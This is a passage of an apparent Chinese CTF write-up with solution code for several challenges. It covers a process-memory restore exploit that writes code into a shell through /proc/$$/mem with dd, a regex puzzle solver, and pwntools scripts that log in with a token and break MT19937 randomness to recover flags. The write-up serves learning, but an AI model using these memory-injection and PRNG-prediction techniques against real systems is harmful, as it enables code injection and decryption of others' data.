           # print(f'    syscall(SYS_mmap, {hex(i[0])}, {hex(i[2])}, {i[1]}, 34, -1, 0);')
           print(f'    "mov rdi, {hex(i[0])};"')
           print(f'    "mov rsi, {hex(i[2])};"')
           print(f'    "mov rdx, {7};"')
           print(f'    "mov r10, 34;"')
           print(f'    "mov r8, -1;"')
           print(f'    "mov r9, 0;"')
           print(f'    "mov rax, 9;"')
           print(f'    "syscall;"')
           
           # print(f'    syscall(SYS_mmap, {hex(i[0])}, {hex(i[2])}, {i[1]}, 34, -1, 0);')
       print(f'    "mov rdi, {hex(maps[5][0])};"')
       print(f'    "mov rsi, {hex(maps[-1][0]-maps[5][0]+maps[-1][2])};"')
       print(f'    "mov rdx, {7};"')
       print(f'    "mov r10, 34;"')
       print(f'    "mov r8, -1;"')
       print(f'    "mov r9, 0;"')
       print(f'    "mov rax, 9;"')
       print(f'    "syscall;"')
       
           
   
   print('    __asm__(')
   output_maps_to_code_munmap(munmap_list)
   output_maps_to_code_mmap(mmap_list)
   print('    );')
   
   ## step3 : copy
   
   print('''    __asm__(
       "mov rax, 2;"
       "lea rdi, core[rip];"
       "xor rsi, rsi;"
       "xor rdx, rdx;"
       "syscall;"
       "mov rdi, rax;"''')
   for i in mmap_list:
       print(f'''    "mov rsi, {hex(i[0])};"
       "mov rdx, {hex(i[2])};"
       "xor rax, rax;"
       "syscall;"''')
   for i in mmap_list:
       x = i[1]
       y = 0
       if x & 4:
           y += 1
       if x & 2:
           y += 2
       if x & 1:
           y += 4
       print(f'''    "mov rdi, {hex(i[0])};"
       "mov rsi, {hex(i[2])};"
       "mov rdx, {y};"
       "mov rax, 10;"
       "syscall;"''')
   
   print('    );')
   
   
   ## step4 : setregister
   
   def register_maps_file_to_maps(file):
       with open(file, "r") as f:
           maps = f.read()
   
       maps = maps.replace("\n", " ").split(" ")
       tmp = []
       for i in maps:
           if i != '':
               tmp.append(i)
       maps = tmp
   
       result = []
       for i in range(0, len(maps), 2):
           register = maps[i]
           value = int(maps[i+1], 16)
           result.append((register, value))
       return result
   register = register_maps_file_to_maps('register.maps')
   print(f'    __asm__(')
   print(f'    "mov rax, {hex(register[-1][1])};"')
   print(f'    "mov stored_rip[rip], rax;"')
   for i in register[:-1]:
       print(f'    "mov {i[0]}, {hex(i[1])};"')
   print(f'    "jmp qword ptr stored_rip[rip];"')
   print(f'    "core:.string \\"/tmp/core\\";"')
   print(f'    "stored_rip:;"')
   print(f'    );')
   
   ## step5 : over
   print('}')
   ```

   last.c

   ```c
   #include <unistd.h>
   #include <sys/syscall.h>
   int main() {
       __asm__(
       "mov rdi, 0x400000;"
       "mov rsi, 0x112000;"
       "mov rax, 11;"
       "syscall;"
       "mov rdi, 0x711000;"
       "mov rsi, 0x3000;"
       "mov rax, 11;"
       "syscall;"
       "mov rdi, 0x714000;"
       "mov rsi, 0x1000;"
       "mov rax, 11;"
       "syscall;"
       "mov rdi, 0x715000;"
       "mov rsi, 0x1000;"
       "mov rax, 11;"
       "syscall;"
       "mov rdi, 0x7f0a83453000;"
       "mov rsi, 0x1000;"
       "mov rax, 11;"
       "syscall;"
       "mov rdi, 0x7f0a83458000;"
       "mov rsi, 0x3000;"
       "mov rax, 11;"
       "syscall;"
       "mov rdi, 0x7ffe63360000;"
       "mov rsi, 0x21000;"
       "mov rax, 11;"
       "syscall;"
       "mov rdi, 0x7ffe633a3000;"
       "mov rsi, 0x4000;"
       "mov rax, 11;"
       "syscall;"
       "mov rdi, 0xffffffffff600000;"
       "mov rsi, 0x1000;"
       "mov rax, 11;"
       "syscall;"
       "mov rdi, 0x7ffff7fcf000;"
       "mov rsi, 0x2000;"
       "mov rdx, 7;"
       "mov r10, 34;"
       "mov r8, -1;"
       "mov r9, 0;"
       "mov rax, 9;"
       "syscall;"
       "mov rdi, 0x7ffff7fd1000;"
       "mov rsi, 0x1000;"
       "mov rdx, 7;"
       "mov r10, 34;"
       "mov r8, -1;"
       "mov r9, 0;"
       "mov rax, 9;"
       "syscall;"
       "mov rdi, 0x7ffff7fd2000;"
       "mov rsi, 0x26000;"
       "mov rdx, 7;"
       "mov r10, 34;"
       "mov r8, -1;"
       "mov r9, 0;"
       "mov rax, 9;"
       "syscall;"
       "mov rdi, 0x7ffff7ff8000;"
       "mov rsi, 0x5000;"
       "mov rdx, 7;"
       "mov r10, 34;"
       "mov r8, -1;"
       "mov r9, 0;"
       "mov rax, 9;"
       "syscall;"
       "mov rdi, 0x7ffff7ffd000;"
       "mov rsi, 0x2000;"
       "mov rdx, 7;"
       "mov r10, 34;"
       "mov r8, -1;"
       "mov r9, 0;"
       "mov rax, 9;"
       "syscall;"
       "mov rdi, 0x7ffff7fff000;"
       "mov rsi, 0x8000000;"
       "mov rdx, 7;"
       "mov r10, 34;"
       "mov r8, -1;"
       "mov r9, 0;"
       "mov rax, 9;"
       "syscall;"
       );
       __asm__(
       "mov rax, 2;"
       "lea rdi, core[rip];"
       "xor rsi, rsi;"
       "xor rdx, rdx;"
       "syscall;"
       "mov rdi, rax;"
       "mov rsi, 0x7ffff7fcf000;"
       "mov rdx, 0x2000;"
       "xor rax, rax;"
       "syscall;"
       "mov rsi, 0x7ffff7fd1000;"
       "mov rdx, 0x1000;"
       "xor rax, rax;"
       "syscall;"
       "mov rsi, 0x7ffff7fd2000;"
       "mov rdx, 0x26000;"
       "xor rax, rax;"
       "syscall;"
       "mov rsi, 0x7ffff7ff8000;"
       "mov rdx, 0x5000;"
       "xor rax, rax;"
       "syscall;"
       "mov rsi, 0x7ffff7ffd000;"
       "mov rdx, 0x2000;"
       "xor rax, rax;"
       "syscall;"
       "mov rsi, 0x7ffff7fff000;"
       "mov rdx, 0x3000;"
       "xor rax, rax;"
       "syscall;"
       "mov rsi, 0x7ffff8002000;"
       "mov rdx, 0x4000;"
       "xor rax, rax;"
       "syscall;"
       "mov rsi, 0x7ffffffde000;"
       "mov rdx, 0x21000;"
       "xor rax, rax;"
       "syscall;"
       "mov rdi, 0x7ffff7fcf000;"
       "mov rsi, 0x2000;"
       "mov rdx, 5;"
       "mov rax, 10;"
       "syscall;"
       "mov rdi, 0x7ffff7fd1000;"
       "mov rsi, 0x1000;"
       "mov rdx, 1;"
       "mov rax, 10;"
       "syscall;"
       "mov rdi, 0x7ffff7fd2000;"
       "mov rsi, 0x26000;"
       "mov rdx, 5;"
       "mov rax, 10;"
       "syscall;"
       "mov rdi, 0x7ffff7ff8000;"
       "mov rsi, 0x5000;"
       "mov rdx, 1;"
       "mov rax, 10;"
       "syscall;"
       "mov rdi, 0x7ffff7ffd000;"
       "mov rsi, 0x2000;"
       "mov rdx, 7;"
       "mov rax, 10;"
       "syscall;"
       "mov rdi, 0x7ffff7fff000;"
       "mov rsi, 0x3000;"
       "mov rdx, 1;"
       "mov rax, 10;"
       "syscall;"
       "mov rdi, 0x7ffff8002000;"
       "mov rsi, 0x4000;"
       "mov rdx, 3;"
       "mov rax, 10;"
       "syscall;"
       "mov rdi, 0x7ffffffde000;"
       "mov rsi, 0x21000;"
       "mov rdx, 3;"
       "mov rax, 10;"
       "syscall;"
       );
       __asm__(
       "mov rax, 0x7ffff7fec290;"
       "mov stored_rip[rip], rax;"
       "mov rax, 0x0;"
       "mov rbx, 0x0;"
       "mov rcx, 0x0;"
       "mov rdx, 0x0;"
       "mov rsi, 0x0;"
       "mov rdi, 0x0;"
       "mov rbp, 0x0;"
       "mov rsp, 0x7fffffffedf0;"
       "mov r8, 0x0;"
       "mov r9, 0x0;"
       "mov r10, 0x0;"
       "mov r11, 0x0;"
       "mov r12, 0x0;"
       "mov r13, 0x0;"
       "mov r14, 0x0;"
       "mov r15, 0x0;"
       "jmp qword ptr stored_rip[rip];"
       "core:.string \"/tmp/core\";"
       "stored_rip:;"
       );
   }
   ```

5. `make`，获得`last`

6. 运行`python extract_main_to_exp2.py`，获得`exp1`

   ```python
   from pwn import *
   
   # main -> stored_rip
   
   e = ELF('./last', checksec=False)
   
   exp1 = e.read(e.sym['main'] + 4, e.sym['stored_rip'] - e.sym['main'] - 4)
   
   with open('exp1', 'wb') as f:
       f.write(exp1)
   
   ```

步骤4

1. 上传`core` , `exp` , `exp1`，`inject`，`inject0`，`last`，`ld.so.6`
2. `cd /proc/$$`
3. `dd if=/tmp/a of=mem bs=1 seek=$((0x4566BA)) count=$((40)) conv=notrunc`
4. `;`

## prob04-filtered

### flag1

```python
f = open('./file/a.txt', 'w')
    

def replace(a, b, repeat=''):
    if repeat:
        repeat = '重复'
    f.write('{}把【{}】替换成【{}】喵\n'.format(repeat, a, b))
def ifjmp(a, b):
    f.write('如果看到【{}】就跳转到【{}】喵\n'.format(a, b))

replace('.', 'a')
replace('\\s', 'a')
replace('(a*)', 'b\\1')
replace('bb', 'b')
# replace('(.*)')
replace('(^|b)'+'a'*10, 'ab', 1)
for i in range(9, -1, -1):
    replace('a'*i+'b', str(i))
replace('^0(.+)', '\\1')
f.write('什么也不做：\n谢谢喵')
```

### flag2

```python
f = open('./file/b.txt', 'w')
    

def replace(a, b, repeat=''):
    if repeat:
        repeat = '重复'
    f.write('{}把【{}】替换成【{}】喵\n'.format(repeat, a, b))
def ifjmp(a, b):
    f.write('如果看到【{}】就跳转到【{}】喵\n'.format(a, b))

replace('(.+)', '\\1==tokentokentokens==\\1')
replace('(\\r?\\n)\\r?\\n', '\\1', 1)
replace('\\r?\\n$', '', 1)
replace('^\\r?\\n', '')
f.write('begin：\n')
replace('==tokentokentokens==.', '==tokentokentokens==')
replace('(.+)==tokentokentokens==(.+)(\\r?\\n)(.+)==tokentokentokens==(\\r?\\n|$)', r'\4==tokentokentokens==\3\1==tokentokentokens==\2\5', 1)
ifjmp('==tokentokentokens==.', 'begin')
replace('(.+)==tokentokentokens==', '\\1')
f.write('什么也不做：\n谢谢喵')
```

## prob08-cookie

### flag1

```python
import random
from mt19937predictor import MT19937Predictor
from pwn import *
from Crypto.Util.number import *

def login():
    p.sendlineafter(b'token: ', b'118:MEQCIAq8vS__Bo8wlAHPCdhuXTd5SqEPxNhODBlWZ8pRfrv8AiBx5OvR2kwt0R6XXfy-wk6CMRPfUAmia6Pn1afJ7ib_HQ==')

p = remote('prob08.geekgame.pku.edu.cn', 10008)
login()
# p = process(['python', './prob08-server.py'])

p.sendlineafter(b'Choose one: ', b'1')
p.recvuntil(b'*You heard a obscure voice coming from the void*\n')
enc = unhex(p.recvuntil(b'\n', drop=True))

predictor = MT19937Predictor()
    
x = int.from_bytes(enc[:2500], 'little')
predictor.setrandbits(x, 2500 * 8)

x = predictor.getrandbits(len(enc[2500:]) * 8)
x = int.from_bytes(enc[2500:], 'little') ^ x
print(x.to_bytes(len(enc[2500:]), 'little'))
```

### flag2

```python
import random
from mt19937predictor import MT19937Predictor
from pwn import *
from Crypto.Util.number import *
from random import Random

def login():
    p.sendlineafter(b'token: ', b'118:MEQCIAq8vS__Bo8wlAHPCdhuXTd5SqEPxNhODBlWZ8pRfrv8AiBx5OvR2kwt0R6XXfy-wk6CMRPfUAmia6Pn1afJ7ib_HQ==')
def xor_arrays(a, b, *args):
    if args:
        return xor_arrays(a, xor_arrays(b, *args))
    return bytes([x ^ y for x, y in zip(a, b)])
p = remote('prob08.geekgame.pku.edu.cn', 10008)
login()
# p = process(['python', './prob08-server.py'])

p.sendlineafter(b'Choose one: ', b'2')
p.recvuntil(b'<')
seed1 = int(p.recvuntil(b'>', drop=True), 16)
seed2 = int(b'123', 16)
p.sendlineafter(b'> ', b'123')
p.recvuntil(b'*You heard a more obscure voice coming from the void*\n')
enc = unhex(p.recvuntil(b'\n', drop=True))

void1 = Random(seed1)
void2 = Random(seed2)

for i in range(1<<22):
    void1.randbytes(i)
    void2.randbytes(i)
    enc = xor_arrays(enc, void1.randbytes(len(enc)), void2.randbytes(len(enc)))

    predictor = MT19937Predictor()
        
    x = int.from_bytes(enc[:2500], 'little')
    predictor.setrandbits(x, 2500 * 8)

    x = predictor.getrandbits(len(enc[2500:]) * 8)
    x = int.from_bytes(enc[2500:], 'little') ^ x
    if b'flag' in x.to_bytes(len(enc[2500:]), 'little'):
        break
    print(i)

print(x.to_bytes(len(enc[2500:]), 'little'))
```

### flag3

```python
import random
from mt19937predictor import MT19937Predictor
from pwn import *
from Crypto.Util.number import *

def login():
    p.sendlineafter(b'token: ', b'118:MEQCIAq8vS__Bo8wlAHPCdhuXTd5SqEPxNhODBlWZ8pRfrv8AiBx5OvR2kwt0R6XXfy-wk6CMRPfUAmia6Pn1afJ7ib_HQ==')

context.log_level = 'debug'
p = remote('prob08.geekgame.pku.edu.cn', 10008)
login()
# p = process(['python', './prob08-server.py'])

p.sendlineafter(b'Choose one: ', b'3')

predictor = MT19937Predictor()

p.recvuntil(b'<')
fmap = p.recvuntil(b'>', drop=True)
p.sendline(fmap)

p.interactive()
```

